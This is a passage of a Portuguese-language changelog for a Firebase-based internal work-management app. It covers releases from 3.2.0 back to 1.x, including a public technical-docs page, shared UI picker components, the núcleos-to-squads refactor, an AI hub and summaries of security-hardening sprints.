  - Removidos TODOs abertos com detalhes específicos (PITR habilitar, App Check setup, rotação de keys) — substituídos por descrição do estado consolidado atual
  - Reescrita seção "Sprint 1" para destacar capacidades de segurança em vez de log operacional
  - Adicionado disclaimer no topo: "página pública, info sensível indisponível externamente"
- **`ACCESS-CONTROL.md`**: nota sobre unificação de núcleos→squads (3.0.0); status do MFA atualizado para "enforcement em rampa por perfil" (era "pendente"); versionamento do doc bumpado para v1.1
- **`INFRA.md`**: cabeçalho ganha aviso de página pública + cross-links para docs irmãos (GOVERNANCE, SECURITY, ACCESS-CONTROL, DATA-FLOW, MIGRATION-CLOUDFLARE)
- **`docs.html`**: doc default ao abrir mudou de `security` para `governance` (entrypoint adequado para auditor externo); nova seção "Governança" no menu lateral

### Security
- **Saneamento de exposição**: SECURITY.md anteriormente listava prefixos truncados de chaves de provedores que vazaram durante desenvolvimento (mesmo truncados, a admissão pública é exposição). Removido em 3.2.0 junto com a abertura pública de `docs.html` em 3.1.0.

---

## [3.1.0+20260505-docs] — 2026-05-05

Release "Docs Públicos". Estabelece a página de documentação técnica acessível externamente para auditoria por especialistas, e adiciona o doc faltante sobre componentes UI compartilhados.

### Added
- **`docs/UI-COMPONENTS.md`** — documentação técnica do `optionPicker` (API completa, 8 padrões de uso comuns: hash determinístico, avatar por inicial, status sem ícone redundante, leitura dinâmica de selects populados em runtime, cascata via `picker-refresh`, `splitEmoji()`, etc), `filterBar`, `taskModal` e demais componentes reusáveis.
- **Seção "Componentes UI compartilhados"** em [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) com cross-link pro UI-COMPONENTS.md.
- **Seção "Versionamento"** em ARCHITECTURE com cross-link pra VERSIONING + CHANGELOG.
- Entradas novas no menu de `docs.html`: `UI-COMPONENTS.md`, `VERSIONING.md`, `CHANGELOG.md` (todos sob "Desenvolvimento").
- **Link "📚 Docs Técnicos" no rodapé da sidebar** — abre `docs.html` em nova aba (target="_blank"), com hover destacando em brand-gold.
- Topbar de `docs.html` exibe a versão da app no momento (ex: `v3.1.0`) lendo de `js/version.js`.

### Changed
- **`docs.html` agora é público** (sem login obrigatório). Decisão deliberada para suportar revisões externas (especialistas TI, parceiros, clientes corporativos) sem onboarding em cada parceiro. Mitigações:
  - `<meta name="robots" content="noindex">` mantém fora de buscadores.
  - Distribuição via link direto (não-listada externamente).
  - Conteúdo é público por design — secrets de prod vivem em Cloud Functions / Secret Manager.
- Removido o auth gate (`onAuthStateChanged` + `isAllowedSSODomain`). Imports correspondentes do Firebase Auth foram removidos da página.
- Footer de `docs.html`: "Documentação interna · não distribuir externamente" → "Documentação técnica · auditoria externa autorizada".

---

## [3.0.0+20260505-pickers] — 2026-05-05

Release "Unidade Visual + Squads-First". Marca o fim do refactor estrutural de núcleos→squads, consolida a unificação visual completa e estabelece versionamento formal.

### Added
- **Esquema de versionamento formal** — `js/version.js` (single source of truth), `CHANGELOG.md`, `docs/VERSIONING.md`, exibição no rodapé da sidebar com build no tooltip, debug helper `window.__PRIMETOUR_VERSION__`.
- **`js/components/optionPicker.js`** — componente genérico de dropdown visual usado em ~96 selects de 23 módulos. Suporta lista plana ou agrupada com acordeão, busca em tempo real, bolinha-cor + ícone + label + sublabel + chevron.
- **Pickers visuais nos modais centrais** (Tarefa, Calendário de Conteúdo, Solicitar Tarefa, Projeto) e nas toolbars de todas as páginas críticas (Tarefas, Projetos, Calendar, Kanban, Timeline, Goals, Feedbacks, CSAT, Users, Requests, Dashboards, Portal Dashboard, Check-in, Auditoria).
- **`filterBar.js` refatorado** — 7 filtros (sector/type/project/area/assignee/status/meta) compartilhados entre Calendar/Kanban/Timeline com identidade visual única.
- **Modais admin migrados** — Goals (9 selects), Feedbacks (10), IA Hub modal de agente (12), IA Skills (7), TaskTypes (5), Settings (3), Sectors/Workspaces/SquadWorkspace (3).
- **Avatar por inicial colorida** em selects de usuário (assignee, gestor, colaborador) — cor estável via hash do ID.
- **`splitEmoji()`** — extrai emoji do início do label automaticamente para virar ícone (Portal de Solicitações).
- **Página pública Calendário de Conteúdo** (`calendario-conteudo.html`) — SSO obrigatório + real-time via `onSnapshot` + filtros (conta, plataforma, categoria, busca).
- **Botão "Converter em Tarefa"** no Calendário de Conteúdo — vincula slot a uma tarefa criada.

### Changed
- **Núcleos → Squads** — modelo de dados unificou os dois conceitos em `squads`. Sync automática entre coleções legadas e novas durante a transição.
- **Calendário de Conteúdo** — formulário simplificado (8 campos vs 13 anteriores), `brief + caption` unificados em `description`, status reduzido para 5 estados canônicos (`idea` → `draft` → `review` → `approved` → `published`).
- **Portal de Solicitações** (`solicitar.html`) — cascata `setor → tipo → variação/núcleo` agora atualiza pickers visuais via `picker-refresh` event.
- **`optionPicker`** — ganhou evento `picker-refresh` (sync visual sem cascada), suporte a `icon: ''` (suprime glifo, ideal para status onde a cor já identifica), listener automático de `change` no select escondido.

### Fixed
- `gfGestorOpts` referenciava `gestorUsers` fora do escopo e quebrava o modal de Nova Meta.
- Type picker mostrava ID em vez de nome do squad quando `store.get('nucleos')` estava vazio.
- Cabeçalho duplicado de emoji nos pickers de tipo de demanda no portal (`📋 📧 Newsletter` → `📧 Newsletter`).
- Backticks dentro de comentário de template literal quebravam parse no browser (HOTFIX em taskTypes.js).
- Banner de override de urgência: parser de data defensivo (Date / Timestamp / sentinel).

---

## [2.x] — Hardening, IA e Portal Web (consolidado retrospectivo, abr/2026)

Bloco consolidado. Versão formal não foi cravada à época; histórico granular em `git log`.

### Highlights

- **IA Hub Fases 1–8** — service `agents.js` + página `IA Hub` (Fase 1) → botões de agente por página (Fase 2) → chat externo + knowledge full + scheduler + tools dinâmicas + custos + cleanup (Fases 3–8).
- **Hardening de Segurança Sprint 1–5**
  - Sprint 1: LOCKDOWN `ai_api_keys` + `system_config` (admin-only) + Cloud Functions infra + `chatWithAI` auto-fallback secure.
  - Sprint 2A/B/C/D: SSO obrigatório, login audit IP, App Check, dailyBackup Firestore→GCS, `agents` direto via Cloud Function.
  - Sprint 3: SIEM digest + threat model + LGPD/SOC2/ISO 27001 docs.
  - Sprint 4: Cloudflare Pages migration prep (`_headers` + `_redirects`).
  - Sprint 5: PITR + per-IP rate limit + secrets audit + tests.
- **Portal Web Fases A/B/C/D** — favoritos (localStorage), mapa preciso, sidebar rename, delete materiais.
- **News Monitor** — split-export em duas tabs (Notícias + Clipping).
- **Override de urgência por SLA** com justificativa + auditoria.
- **Realtime Database (presence)** — migração com `onDisconnect` nativo (depois revertida).
- **Steps page** — filtro status + agrupamento por outro campo (group-by).
- **AI Skills** — central de skills por módulo, configuração de provider/modelo, prompt engineering com voice doc.

### Changed (estrutural)

- Header do Tarefas consolidado de 6 → 3 botões (split-export + overflow menu).
- CSAT consolidado de 5 → 3 botões.
- Goals/Feedbacks/Users — split-export uniforme + GAP fix de filtro de setor.

---

## [1.x] — Lançamento e primeiros módulos (consolidado retrospectivo, mar/2026)

Bloco consolidado. Período inicial sem versionamento formal.

### Highlights

- Lançamento em produção (13/03/2026): infra Firebase + Auth + Firestore.
- **Módulos centrais**: Tarefas (com kanban, timeline, calendar views), Projetos, Goals, Feedbacks, CSAT, Users, Auditoria.
- **Portal de Solicitações** (`solicitar.html`) — formulário público autenticado para captura de demandas.
- **Calendário de Conteúdo** — planejamento de publicações em redes sociais.
- **RBAC dinâmico** — roles configuráveis em runtime, permissões por module key.
- **SSO Microsoft** (`primetour.com.br`) — primeira versão antes do multi-domínio.
- **Check-in** — módulo novo migrado de "reservamesa", inclui ponto eletrônico.
- **Multi-sector** — usuários com visibilidade restrita a setores específicos.
- **Sidebar** com paleta dinâmica + ícones SVG inline (Lucide-style), substitui Unicode/emoji para alinhamento consistente.
